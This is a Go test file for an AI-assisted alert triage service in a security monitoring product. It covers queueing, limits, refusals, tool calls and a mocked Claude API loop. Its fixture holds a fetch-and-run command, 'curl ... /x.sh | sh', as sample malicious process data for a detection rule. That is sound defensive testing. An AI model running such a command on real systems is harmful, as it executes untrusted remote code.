package triage

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/anthropics/anthropic-sdk-go/option"

	"github.com/Netdoodle/homexdr/server/internal/events"
	"github.com/Netdoodle/homexdr/server/internal/store"
	"github.com/Netdoodle/homexdr/shared/api"
	"github.com/Netdoodle/homexdr/shared/event"
)

type fixture struct {
	st    *store.Store
	ev    events.Store
	svc   *Service
	alert *store.Alert
	root  *event.Event // parent process
	hit   *event.Event // the alerting process start
	child *event.Event
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	ctx := context.Background()
	dir := t.TempDir()
	st, err := store.Open(filepath.Join(dir, "state.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { st.Close() })
	ev, err := events.OpenSQLite(filepath.Join(dir, "events.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { ev.Close() })
	if _, err := st.CreateEndpoint(ctx, "h1", api.HostInfo{Hostname: "lab-1", OS: event.OS{Platform: "linux"}}, nil, "1"); err != nil {
		t.Fatal(err)
	}
	now := time.Now().UTC()
	proc := func(entity, parent, name, cmd string, at time.Time) *event.Event {
		return &event.Event{
			ID: event.NewID(), Timestamp: at,
			Host:  event.Host{ID: "h1", Name: "lab-1", OS: &event.OS{Platform: "linux"}},
			Event: event.Meta{Kind: event.KindEvent, Category: []string{"process"}, Type: []string{"start"}, Module: "procconn"},
			Process: &event.Process{EntityID: entity, PID: 10, Name: name, CommandLine: cmd,
				Parent: &event.Process{EntityID: parent}},
		}
	}
	f := &fixture{st: st, ev: ev}
	f.root = proc("e-bash", "", "bash", "bash", now.Add(-10*time.Minute))
	f.hit = proc("e-curl", "e-bash", "curl", "curl http://203.0.113.9/x.sh | sh", now.Add(-5*time.Minute))
	f.child = proc("e-sh", "e-curl", "sh", "sh", now.Add(-4*time.Minute))
	if err := ev.Insert(ctx, []*event.Event{f.root, f.hit, f.child}); err != nil {
		t.Fatal(err)
	}
	a, isNew, err := st.RecordAlert(ctx, store.AlertInput{
		Rule:     store.AlertRule{ID: "r1", Title: "Curl piped to shell", Level: store.SevHigh},
		Severity: store.SevHigh, Event: f.hit,
	})
	if err != nil || !isNew {
		t.Fatal(err)
	}
	f.alert = a
	f.svc = New(st, ev, slog.New(slog.NewTextHandler(io.Discard, nil)))
	return f
}

// fakeProvider submits a fixed report after one search, or fails/refuses on request.
type fakeProvider struct {
	mu      sync.Mutex
	calls   int
	refuse  bool
	fail    error
	verdict string
}

func (p *fakeProvider) name() string  { return "fake" }
func (p *fakeProvider) model() string { return "fake-model" }
func (p *fakeProvider) test(context.Context) (string, error) {
	return "fake-model", nil
}

func (p *fakeProvider) investigate(ctx context.Context, inv *investigation) error {
	p.mu.Lock()
	p.calls++
	p.mu.Unlock()
	if p.fail != nil {
		return p.fail
	}
	if p.refuse {
		inv.refusal = "cyber"
		return nil
	}
	if out, isErr := inv.call(ctx, "search_events", json.RawMessage(`{"query":"process.name:curl","host_id":"h1"}`)); isErr {
		return errors.New(out)
	}
	report := `{"verdict":"` + p.verdict + `","confidence":"high","severity_assessment":"high","summary":"Curl piped a script into a shell.",
		"analysis":"...","evidence":[],"mitre":[{"technique_id":"T1059.004","name":"Unix Shell"}],
		"recommended_actions":[{"action":"Isolate the host","reason":"Remote script execution"}],"open_questions":[]}`
	if out, isErr := inv.call(ctx, "submit_triage", json.RawMessage(report)); isErr {
		return errors.New(out)
	}
	return nil
}

func (f *fixture) useProvider(p provider) {
	f.svc.newProvider = func(Settings, string) (provider, error) { return p, nil }
}

func (f *fixture) save(t *testing.T, mut func(*Settings)) {
	t.Helper()
	set := DefaultSettings()
	set.APIKey = "sk-test-0000000000"
	if mut != nil {
		mut(&set)
	}
	if _, err := f.svc.SaveSettings(context.Background(), set); err != nil {
		t.Fatal(err)
	}
}

// drain runs the worker until the queue is empty.
func (f *fixture) drain(t *testing.T) {
	t.Helper()
	ctx := context.Background()
	for {
		tr, err := f.st.ClaimTriage(ctx)
		if errors.Is(err, store.ErrNotFound) {
			return
		}
		if err != nil {
			t.Fatal(err)
		}
		f.svc.process(ctx, tr)
	}
}

func TestAutoTriage(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	p := &fakeProvider{verdict: "malicious"}
	f.useProvider(p)

	// No API key: nothing is queued.
	f.svc.AlertCreated(ctx, f.alert)
	if _, err := f.st.GetTriage(ctx, f.alert.ID); !errors.Is(err, store.ErrNotFound) {
		t.Fatalf("queued without a key: %v", err)
	}
	// Below the threshold: nothing is queued.
	f.save(t, func(s *Settings) { s.MinSeverity = store.SevCritical })
	f.svc.AlertCreated(ctx, f.alert)
	if _, err := f.st.GetTriage(ctx, f.alert.ID); !errors.Is(err, store.ErrNotFound) {
		t.Fatalf("queued a high alert with min critical: %v", err)
	}

	f.save(t, nil) // medium and above
	f.svc.AlertCreated(ctx, f.alert)
	tr, err := f.st.GetTriage(ctx, f.alert.ID)
	if err != nil || tr.Status != store.TriageQueued || tr.Trigger != TriggerAuto {
		t.Fatalf("triage = %+v, %v", tr, err)
	}
	// A second trigger while queued does not duplicate.
	f.svc.AlertCreated(ctx, f.alert)
	f.drain(t)
	if p.calls != 1 {
		t.Fatalf("investigated %d times", p.calls)
	}
	tr, _ = f.st.GetTriage(ctx, f.alert.ID)
	if tr.Status != store.TriageDone || tr.Verdict != "malicious" || tr.Confidence != "high" || tr.ToolCalls != 1 {
		t.Fatalf("finished triage = %+v", tr)
	}
	var rep Report
	if err := json.Unmarshal(tr.Report, &rep); err != nil || rep.Mitre[0].TechniqueID != "T1059.004" {
		t.Fatalf("report %s: %v", tr.Report, err)
	}
	var calls []ToolCall
	if err := json.Unmarshal(tr.Transcript, &calls); err != nil || len(calls) != 2 || calls[0].Tool != "search_events" {
		t.Fatalf("transcript %s: %v", tr.Transcript, err)
	}
	if !strings.Contains(calls[0].Output, "e-curl") {
		t.Fatalf("search tool output missing the event: %s", calls[0].Output)
	}
	// The alert itself is untouched; the list shows the verdict.
	a, _ := f.st.GetAlert(ctx, f.alert.ID)
	if a.Status != store.AlertNew || a.AITriage == nil || a.AITriage.Verdict != "malicious" {
		t.Fatalf("alert after triage: status %s, ai %+v", a.Status, a.AITriage)
	}
	// It was audited as the AI.
	entries, _, _ := f.st.ListAudit(ctx, 10, 0)
	if len(entries) == 0 || entries[0].User != "ai" || entries[0].Action != "ai.triage" {
		t.Fatalf("audit %+v", entries)
	}
}

func TestDailyLimitAndManual(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	f.useProvider(&fakeProvider{verdict: "benign"})
	f.save(t, func(s *Settings) { s.DailyLimit = 1 })
	if _, err := f.st.QueueTriage(ctx, "other-alert-does-not-exist", TriggerAuto, ""); err == nil {
		t.Fatal("triage for a missing alert accepted (foreign key)")
	}
	// Use up the day's limit with another alert.
	other, _, err := f.st.RecordAlert(ctx, store.AlertInput{Rule: store.AlertRule{ID: "r2", Title: "x", Level: "high"}, Severity: "high", Event: f.root})
	if err != nil {
		t.Fatal(err)
	}
	f.svc.AlertCreated(ctx, other)
	f.svc.AlertCreated(ctx, f.alert)
	tr, _ := f.st.GetTriage(ctx, f.alert.ID)
	if tr.Status != store.TriageSkipped || !strings.Contains(tr.Error, "daily limit") {
		t.Fatalf("over the limit: %+v", tr)
	}
	// A person can still ask for it.
	if _, err := f.svc.Request(ctx, f.alert.ID, "alice"); err != nil {
		t.Fatal(err)
	}
	if _, err := f.svc.Request(ctx, f.alert.ID, "alice"); !errors.Is(err, store.ErrConflict) {
		t.Fatalf("second request while queued: %v", err)
	}
	f.drain(t)
	tr, _ = f.st.GetTriage(ctx, f.alert.ID)
	if tr.Status != store.TriageDone || tr.Trigger != TriggerManual || tr.RequestedBy != "alice" {
		t.Fatalf("manual triage %+v", tr)
	}
	// Turned off: requests are refused.
	f.save(t, func(s *Settings) { s.Enabled = false })
	if _, err := f.svc.Request(ctx, f.alert.ID, "alice"); !errors.Is(err, ErrNotReady) {
		t.Fatalf("request while off: %v", err)
	}
}

func TestFailedAndRefused(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	f.save(t, nil)
	f.useProvider(&fakeProvider{fail: errors.New("boom")})
	f.svc.AlertCreated(ctx, f.alert)
	f.drain(t)
	tr, _ := f.st.GetTriage(ctx, f.alert.ID)
	if tr.Status != store.TriageFailed || tr.Error != "boom" {
		t.Fatalf("failed triage %+v", tr)
	}
	f.useProvider(&fakeProvider{refuse: true})
	if _, err := f.svc.Request(ctx, f.alert.ID, "bob"); err != nil {
		t.Fatal(err)
	}
	f.drain(t)
	tr, _ = f.st.GetTriage(ctx, f.alert.ID)
	if tr.Status != store.TriageRefused || !strings.Contains(tr.Error, "cyber") {
		t.Fatalf("refused triage %+v", tr)
	}
}

func TestSettingsValidate(t *testing.T) {
	bad := []func(*Settings){
		func(s *Settings) { s.Provider = "acme" },
		func(s *Settings) { s.MinSeverity = "urgent" },
		func(s *Settings) { s.DailyLimit = 0 },
		func(s *Settings) { s.MaxToolCalls = 500 },
		func(s *Settings) { s.Model = "claude opus" },
	}
	for i, mut := range bad {
		s := DefaultSettings()
		mut(&s)
		if err := s.Validate(); err == nil {
			t.Errorf("case %d accepted", i)
		}
	}
	s := DefaultSettings()
	s.Model = ""
	if err := s.Validate(); err != nil || s.Model != DefaultModel {
		t.Fatalf("empty model: %v %q", err, s.Model)
	}
}

func TestTools(t *testing.T) {
	ctx := context.Background()
	f := newFixture(t)
	box := &toolbox{st: f.st, ev: f.ev, alert: f.alert}
	tools := map[string]Tool{}
	for _, tl := range box.tools() {
		tools[tl.Name] = tl
	}
	run := func(name, in string) string {
		t.Helper()
		out, err := tools[name].Run(ctx, json.RawMessage(in))
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		return out
	}
	if out := run("get_process_tree", `{"host_id":"h1","entity_id":"e-curl"}`); !strings.Contains(out, `"e-bash"`) || !strings.Contains(out, `"e-sh"`) {
		t.Fatalf("process tree lacks parent or child: %s", out)
	}
	if out := run("get_event", `{"event_id":"`+f.hit.ID+`"}`); !strings.Contains(out, "x.sh") {
		t.Fatalf("get_event: %s", out)
	}
	if out := run("get_host", `{"host_id":"h1"}`); !strings.Contains(out, "lab-1") {
		t.Fatalf("get_host: %s", out)
	}
	if out := run("list_alerts", `{}`); !strings.Contains(out, "this is the alert under investigation") {
		t.Fatalf("list_alerts: %s", out)
	}
	if _, err := tools["search_events"].Run(ctx, json.RawMessage(`{"query":"(broken"}`)); err == nil {
		t.Fatal("invalid query accepted")
	}
	if out := run("search_events", `{"query":"| stats count by host.name"}`); !strings.Contains(out, `"columns":["host.name","count"]`) || !strings.Contains(out, `"lab-1"`) {
		t.Fatalf("search_events pipeline: %s", out)
	}
	if _, err := tools["submit_triage"].Run(ctx, json.RawMessage(`{"verdict":"fine","confidence":"high","summary":"x"}`)); err == nil {
		t.Fatal("invalid verdict accepted")
	}
	// Long strings are trimmed before they reach the model.
	long := map[string]any{"a": strings.Repeat("x", 5000), "original": "dropped"}
	c := compact(long).(map[string]any)
	if len(c["a"].(string)) > maxStringField+20 || c["original"] != nil {
		t.Fatalf("compact: %v", c)
	}
}

// --- Claude provider against a fake Messages API ---

type fakeClaude struct {
	t         *testing.T
	mu        sync.Mutex
	responses []string         // returned in order
	requests  []map[string]any // decoded bodies
	headers   []http.Header
	reject    int // reject the first N requests that carry fallbacks with a 400
}

func (fc *fakeClaude) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	fc.mu.Lock()
	defer fc.mu.Unlock()
	var body map[string]any
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		fc.t.Errorf("bad request body: %v", err)
	}
	if _, has := body["fallbacks"]; has && fc.reject > 0 {
		fc.reject--
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(400)
		io.WriteString(w, `{"type":"error","error":{"type":"invalid_request_error","message":"fallbacks: not available for this account"}}`)
		return
	}
	fc.requests = append(fc.requests, body)
	fc.headers = append(fc.headers, r.Header.Clone())
	if len(fc.responses) == 0 {
		w.WriteHeader(500)
		return
	}
	resp := fc.responses[0]
	fc.responses = fc.responses[1:]
	w.Header().Set("Content-Type", "application/json")
	io.WriteString(w, resp)
}

func msg(stop string, content string) string {
	return `{"id":"msg_x","type":"message","role":"assistant","model":"claude-opus-5-5","content":` + content +
		`,"stop_reason":"` + stop + `","stop_details":null,"usage":{"input_tokens":100,"output_tokens":10,"cache_read_input_tokens":40,"cache_creation_input_tokens":5}}`
}

const submitInput = `{"verdict":"suspicious","confidence":"medium","severity_assessment":"medium","summary":"s","analysis":"a","evidence":[],"mitre":[],"recommended_actions":[],"open_questions":[]}`

func runClaude(t *testing.T, f *fixture, fc *fakeClaude) (*investigation, error) {
	t.Helper()
	srv := httptest.NewServer(fc)
	t.Cleanup(srv.Close)
	p := newClaude("sk-test", "claude-opus-5-5", option.WithBaseURL(srv.URL), option.WithMaxRetries(0))
	box := &toolbox{st: f.st, ev: f.ev, alert: f.alert}
	inv := &investigation{system: systemPrompt, initial: initialMessage(f.alert, []*event.Event{f.hit}), tools: box.tools(),
		box: box, maxToolCalls: 5, byName: map[string]Tool{}}
	for _, tl := range inv.tools {
		inv.byName[tl.Name] = tl
	}
	return inv, p.investigate(context.Background(), inv)
}

func TestClaudeLoop(t *testing.T) {
	f := newFixture(t)
	fc := &fakeClaude{t: t, responses: []string{
		msg("tool_use", `[{"type":"tool_use","id":"tu_1","name":"get_process_tree","input":{"host_id":"h1","entity_id":"e-curl"}}]`),
		msg("end_turn", `[{"type":"text","text":"Looks like a dropper."}]`), // forgot to submit: nudged
		msg("tool_use", `[{"type":"tool_use","id":"tu_2","name":"submit_triage","input":`+submitInput+`}]`),
	}}
	inv, err := runClaude(t, f, fc)
	if err != nil {
		t.Fatal(err)
	}
	if inv.box.report == nil || inv.box.report.Verdict != "suspicious" {
		t.Fatalf("report %+v", inv.box.report)
	}
	if len(fc.requests) != 3 {
		t.Fatalf("%d requests", len(fc.requests))
	}
	first := fc.requests[0]
	if first["model"] != "claude-opus-5-5" || first["thinking"] != nil {
		t.Fatalf("model/thinking: %v %v", first["model"], first["thinking"])
	}
	if oc, _ := first["output_config"].(map[string]any); oc["effort"] != "high" {
		t.Fatalf("output_config %v", first["output_config"])
	}
	if first["fallbacks"] != "default" || !strings.Contains(fc.headers[0].Get("anthropic-beta"), "server-side-fallback-2026-07-01") {
		t.Fatalf("fallbacks %v / beta %q", first["fallbacks"], fc.headers[0].Get("anthropic-beta"))
	}
	if _, ok := first["cache_control"]; !ok {
		t.Fatal("no cache_control")
	}
	if first["tool_choice"] != nil {
		t.Fatal("tool_choice must not be forced")
	}
	strictSubmit := false
	for _, tl := range first["tools"].([]any) {
		m := tl.(map[string]any)
		if m["name"] == "submit_triage" && m["strict"] == true {
			strictSubmit = true
		}
		if schema := m["input_schema"].(map[string]any); schema["additionalProperties"] != false {
			t.Fatalf("tool %v allows additional properties", m["name"])
		}
	}
	if !strictSubmit {
		t.Fatal("submit_triage is not strict")
	}
	// Append-only history: each request extends the previous one.
	m1 := fc.requests[1]["messages"].([]any)
	m2 := fc.requests[2]["messages"].([]any)
	if len(m1) != 3 || len(m2) != 5 {
		t.Fatalf("history lengths %d, %d", len(m1), len(m2))
	}
	b1, _ := json.Marshal(m1)
	b2, _ := json.Marshal(m2[:3])
	if string(b1) != string(b2) {
		t.Fatal("history was rewritten between turns")
	}
	toolResult := m1[2].(map[string]any)["content"].([]any)[0].(map[string]any)
	if toolResult["type"] != "tool_result" || toolResult["tool_use_id"] != "tu_1" || !strings.Contains(resultText(toolResult), "e-bash") {
		t.Fatalf("tool result %v", toolResult)
	}
	if inv.usage.InputTokens != 315 || inv.usage.CacheReadTokens != 120 || inv.toolCalls != 1 {
		t.Fatalf("usage %+v, tool calls %d", inv.usage, inv.toolCalls)
	}
}

// resultText returns a tool_result's text, sent either as a string or as text blocks.
func resultText(res map[string]any) string {
	switch c := res["content"].(type) {
	case string:
		return c
	case []any:
		var b strings.Builder
		for _, part := range c {
			if m, ok := part.(map[string]any); ok {
				b.WriteString(fmt.Sprint(m["text"]))
			}
		}
		return b.String()
	}
	return ""
}

func TestClaudeRefusalAndFallbackRetry(t *testing.T) {
	f := newFixture(t)
	refusal := `{"id":"msg_r","type":"message","role":"assistant","model":"claude-opus-5-5","content":[],"stop_reason":"refusal",` +
		`"stop_details":{"type":"refusal","category":"cyber","explanation":"x"},"usage":{"input_tokens":10,"output_tokens":0}}`
	fc := &fakeClaude{t: t, reject: 1, responses: []string{refusal}}
	inv, err := runClaude(t, f, fc)
	if err != nil {
		t.Fatal(err)
	}
	if inv.refusal != "cyber" {
		t.Fatalf("refusal %q", inv.refusal)
	}
	// The 400 on fallbacks was retried without them.
	if len(fc.requests) != 1 || fc.requests[0]["fallbacks"] != nil {
		t.Fatalf("retry carried fallbacks: %v", fc.requests)
	}
}

func TestClaudeToolBudget(t *testing.T) {
	f := newFixture(t)
	call := func(id string) string {
		return msg("tool_use", `[{"type":"tool_use","id":"`+id+`","name":"get_host","input":{"host_id":"h1"}}]`)
	}
	fc := &fakeClaude{t: t, responses: []string{call("a"), call("b"), call("c"), call("d"), call("e"), call("f"),
		msg("tool_use", `[{"type":"tool_use","id":"z","name":"submit_triage","input":`+submitInput+`}]`)}}
	inv, err := runClaude(t, f, fc)
	if err != nil {
		t.Fatal(err)
	}
	if inv.toolCalls != 5 || inv.box.report == nil {
		t.Fatalf("tool calls %d, report %v", inv.toolCalls, inv.box.report)
	}
	last := fc.requests[6]["messages"].([]any)
	res := last[len(last)-1].(map[string]any)["content"].([]any)[0].(map[string]any)
	if res["is_error"] != true || !strings.Contains(resultText(res), "budget") {
		t.Fatalf("over-budget call not refused: %v", res)
	}
}
